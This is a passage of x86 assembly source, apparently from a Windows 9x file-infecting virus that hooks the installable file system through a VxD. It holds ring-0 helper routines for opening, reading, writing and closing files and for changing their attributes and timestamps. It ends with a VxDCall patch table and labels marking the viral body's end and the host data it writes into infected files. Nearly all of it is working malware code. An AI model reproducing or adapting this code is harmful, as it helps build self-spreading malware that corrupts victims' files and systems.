   ;           structure format is to be returned
   ;   return:
   ;     CFlag = 0 (no error)
   ;       eax = filled in with the unicode pathname in the ParsedPath
   ;             structure format
   ;     CFlag = 1 (error)
   ;       eax = error code
   GetFindInfoByHandle:
                   pushfd
                   pushad
                   mov     ds:[ioreq ptr ebx.ir_flags],ENUMH_GETFINDINFO
                   mov     ds:[ioreq ptr ebx.ir_ppath],eax

                   call    GetHndlfunc
                   mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                   push    ebx
                   call    ds:[hndlmisc ptr eax.hm_func+HM_ENUMHANDLE*4]
                   pop     ebx

                   movzx   eax,ds:[ioreq ptr ebx.ir_error]
                   cmp     eax,1
                   sbb     ecx,ecx
                   inc     ecx
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],ecx
                   popad
                   popfd
                   ret


   ; get file name by handle (enumerate handle)
   ;   entry:
   ;     ebx = pointer to the ifsreq
   ;     esi = pointer to a buffer the unicode pathname in the ParsedPath
   ;           structure format is to be returned
   ;     ecx = the maximum length in bytes of the buffer(edi),
   ;           excluding the NUL character
   ;     edi = pointer to a buffer the BCS pathname is to be returned
   ;   return:
   ;     CFlag = 0 (no error)
   ;       eax = return the number of bytes in the converted unicode pathname
   ;       esi = filled in with the unicode pathname in the ParsedPath
   ;             structure format
   ;       edi = filled in with the BCS pathname
   ;     CFlag = 1 (error)
   ;       eax = error code
   GetFileNameByHandle:
                   pushfd
                   pushad
                   mov     ds:[ioreq ptr ebx.ir_flags],ENUMH_GETFILENAME
                   mov     ds:[ioreq ptr ebx.ir_ppath],esi

                   call    GetHndlfunc
                   mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                   push    ecx
                   push    ebx
                   call    ds:[hndlmisc ptr eax.hm_func+HM_ENUMHANDLE*4]
                   pop     ebx
                   pop     ecx

                   movzx   eax,ds:[ioreq ptr ebx.ir_error]
                   cmp     eax,1
                   sbb     edx,edx
                   inc     edx
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],edx
                   dec     edx
                   jz      GfnbhDone

                   mov     eax,ds:Drive
                   add     al,'A'-1
                   cmp     al,'A'
                   jb      volUNC_charFSD
                   stosb
                   mov     al,':'
                   stosb
                   dec     ecx
                   dec     ecx

   volUNC_charFSD: push    CodePage
                   push    ecx
                   lea     eax,ds:[ParsedPath ptr esi.pp_elements]
                   push    eax
                   push    edi
   VxDCall6:       VxDCall UniToBCSPath
                   add     esp,4*4
                   xchg    edx,eax
                   cmp     eax,1
                   sbb     ecx,ecx
                   inc     ecx
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],ecx
                   dec     ecx
                   jz      GfnbhDone

                   xchg    edx,eax
                   sub     edi,ss:[pfad ptr esp.pfad_edi]
                   add     eax,edi
   GfnbhDone:      mov     ss:[pfad ptr esp.pfad_eax],eax
                   popad
                   popfd
                   ret


   ; open file
   ;   entry:
   ;     al  = desired access & sharing mode info
   ;     ebx = pointer to the ifsreq
   ;   return:
   ;     CFlag = 0 (no error)
   ;       eax = action performed by the FSD
   ;     CFlag = 1 (error)
   ;       eax = error code
   OpenFile:       pushfd
                   pushad
                   mov     ds:[ioreq ptr ebx.ir_flags],al
                   mov     ds:[ioreq ptr ebx.ir_options],ACTION_OPENEXISTING
                   mov     eax,ss:pifshp
                   lea     eax,[ifshp ptr eax.our_hfunc]
                   mov     ds:[ioreq ptr ebx.ir_hfunc],eax
                   mov     ds:[ioreq ptr ebx.ir_ptuninfo],0
                   mov     ds:[ioreq ptr ebx.ir_pos],0
                   mov     eax,ds:[ifsreq ptr ebx.ifs_psr]
                   mov     eax,ds:[shres ptr eax.sr_func]
                   push    ebx
                   call    ds:[volfunc ptr eax.vfn_func+VFN_OPEN*4]
                   pop     ebx

                   movzx   eax,ds:[ioreq ptr ebx.ir_error]
                   cmp     eax,1
                   sbb     ecx,ecx
                   inc     ecx
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],ecx
                   dec     ecx
                   jz      OpenDone

                   movzx   eax,ds:[ioreq ptr ebx.ir_options]
   OpenDone:       mov     ss:[pfad ptr esp.pfad_eax],eax
                   popad
                   popfd
                   ret


   ; close file
   ;   ebx = pointer to the ifsreq
   ;   return:
   ;     CFlag = 0 (no error)
   ;       eax = 0
   ;     CFlag = 1 (error)
   ;       eax = error code
   CloseFile:
                   pushfd
                   pushad

                   mov     ds:[ioreq ptr ebx.ir_options],0
                   mov     ds:[ioreq ptr ebx.ir_flags],CLOSE_FINAL
                   call    GetHndlfunc
                   mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                   push    ebx
                   call    ds:[hndlmisc ptr eax.hm_func+HM_CLOSE*4]
                   pop     ebx

                   movzx   eax,ds:[ioreq ptr ebx.ir_error]
                   cmp     eax,1
                   sbb     ecx,ecx
                   inc     ecx
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],ecx
                   mov     ss:[pfad ptr esp.pfad_eax],eax

                   popad
                   popfd
                   ret

   ; get/set file attributes
   ;   eax = Supplies new attributes for file on set commands
   ;   ebx = pointer to the ifsreq
   ; return:
   ;   CFlag = 0 (no error)
   ;     eax = attributes
   ;   CFlag = 1 (error)
   ;     eax = error code
   GetFileAttributes:
                   pushf
                   pushad
                   mov     ds:[ioreq ptr ebx.ir_flags],GET_ATTRIBUTES
                   jmp     GetSetAttributes

   SetFileAttributes:
                   pushf
                   pushad
                   mov     ds:[ioreq ptr ebx.ir_flags],SET_ATTRIBUTES
                   jmp     GetSetAttributes

   GetSetAttributes:
                   mov     ds:[ioreq ptr ebx.ir_attr],eax

                   mov     eax,ds:[ifsreq ptr ebx.ifs_psr]
                   mov     eax,ds:[shres ptr eax.sr_func]
                   push    ebx
                   call    ds:[volfunc ptr eax.vfn_func+VFN_FILEATTRIB*4]
                   pop     ebx

                   movzx   eax,ds:[ioreq ptr ebx.ir_error]
                   cmp     eax,1
                   sbb     ecx,ecx
                   inc     ecx
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],ecx
                   dec     ecx
                   jz      GetSetAttributesDone

                   mov     eax,ds:[ioreq ptr ebx.ir_attr]
   GetSetAttributesDone:
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   popad
                   popfd
                   ret



   ; get/set file date and time
   ;   entry:
   ;     eax = Supplies new date and time for file on set commands
   ;     ebx = pointer to the ifsreq
   ;   return:
   ;     CFlag = 0 (no error)
   ;       eax = file date and time
   ;     CFlag = 1 (error)
   ;       eax = error code
   GetFileDateTime:pushfd
                   pushad
                   mov     ds:[ioreq ptr ebx.ir_flags],GET_MODIFY_DATETIME
                   jmp     GetSetDateTime

   SetFileDateTime:pushfd
                   pushad
                   mov     ds:[ioreq ptr ebx.ir_flags],SET_MODIFY_DATETIME

   GetSetDateTime: mov     ds:[ioreq ptr ebx.ir_dostime],eax
                   call    GetHndlfunc
                   mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                   push    ebx
                   call    ds:[hndlmisc ptr eax.hm_func+HM_FILETIMES*4]
                   pop     ebx

                   movzx   eax,ds:[ioreq ptr ebx.ir_error]
                   cmp     eax,1
                   sbb     ecx,ecx
                   inc     ecx
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],ecx
                   dec     ecx
                   jz      FileDateTimeDone

                   mov     eax,ds:[ioreq ptr ebx.ir_dostime]
   FileDateTimeDone:
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   popad
                   popfd
                   ret


   ; set ST structure and read file
   SetST&ReadFile: mov     ds:[st ptr (esi-size st).st_size],cx
                   mov     ds:[st ptr (esi-size st).st_pt],edx

   ; read/write file
   ;   entry:
   ;     ebx = pointer to the ifsreq
   ;     ecx = number of bytes to read/write
   ;     edx = file position to begin reading/writing at
   ;     esi = pointer to the data buffer to read/write
   ;   return:
   ;     CFlag = 0 (no error)
   ;       eax = number of bytes actually read/written
   ;       edx = new file position
   ;     CFlag = 1 (error)
   ;       eax = error code
   ReadFile:       pushfd
                   pushad
                   mov     eax,ss:FSDFnAddr
                   cmp     ss:FunctionNum,IFSFN_READ
                   je      ReadWriteCommon
                   call    GetHndlfunc
                   mov     eax,ds:[hndlfunc ptr eax.hf_read]
                   jmp     ReadWriteCommon

   WriteFile:      pushfd
                   pushad
                   mov     eax,ss:FSDFnAddr
                   cmp     ss:FunctionNum,IFSFN_WRITE
                   je      ReadWriteCommon
                   call    GetHndlfunc
                   mov     eax,ds:[hndlfunc ptr eax.hf_write]

   ReadWriteCommon:mov     ds:[ioreq ptr ebx.ir_data],esi
                   mov     ds:[ioreq ptr ebx.ir_length],ecx
                   mov     ds:[ioreq ptr ebx.ir_pos],edx
                   mov     ds:[ioreq ptr ebx.ir_options],0

                   push    ebx
                   call    eax
                   pop     ebx

                   movzx   eax,ds:[ioreq ptr ebx.ir_error]
                   cmp     eax,1
                   sbb     ecx,ecx
                   inc     ecx
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],ecx
                   dec     ecx
                   jz      ReadWriteDone

                   mov     eax,ds:[ioreq ptr ebx.ir_pos]
                   mov     ss:[pfad ptr esp.pfad_edx],eax
                   mov     eax,ds:[ioreq ptr ebx.ir_length]
   ReadWriteDone:  mov     ss:[pfad ptr esp.pfad_eax],eax
                   popad
                   popfd
                   ret

   ; for patch VxDCall code
   VxDCall_tbl     dd      VxDCall0,VxDCall1,VxDCall2,VxDCall3
                   dd      VxDCall4,VxDCall5,VxDCall6
                   dd      VxDCall8
   VxDCall_tbl_size equ    ($-VxDCall_tbl)

   vir_end:
                   ; for define memory data
   vir_mem_end:
                   org     vir_end
                   ; for define file data
   HostData        host_data       <0>
   vir_file_end:

                   end     start
